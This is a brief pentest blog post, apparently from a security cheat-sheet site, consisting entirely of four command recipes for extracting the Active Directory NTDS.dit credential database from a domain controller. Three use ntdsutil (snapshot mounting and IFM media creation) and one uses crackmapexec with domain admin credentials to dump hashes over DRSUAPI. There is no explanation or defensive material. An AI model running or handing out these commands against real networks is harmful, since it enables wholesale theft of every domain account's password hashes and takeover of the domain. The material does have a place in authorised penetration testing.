---
layout: single
classes: wide
author_profile: true
read_time: true
share: true
related: true
title:  "Internal Infrastructure Pentest - Extracting NTDS.DIT File"
date:   2019-06-22 15:29:10 +1000
categories:
  - Internal Pentest
  - Internal Infrastructure Pentest
  - Network Pentest
tags:
  - NTDS
  - DIT file extraction
  - Windows Security
  - Active Directory Hacking
---
<b>Method1:</b>
<pre>
ntdsutil snapshot "activate instance ntds" create quit quit
ntdsutil snapshot "mount {GUID}" quit quit
copy "MOUNT_POINT\windows\ntds\ntds.dit" "c:\temp\ntds.dit"
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit
</pre>

<b>Method2:</b>
<pre>
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
</pre>

<b>Method3:</b>
<pre>
ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q
</pre>

<b>Method4:</b>
```
crackmapexec.py -u DA_USERNAME -p DA_PASSWORD -d FQDN_DOMAIN DOMAIN_IP --ntds drsuapi
```
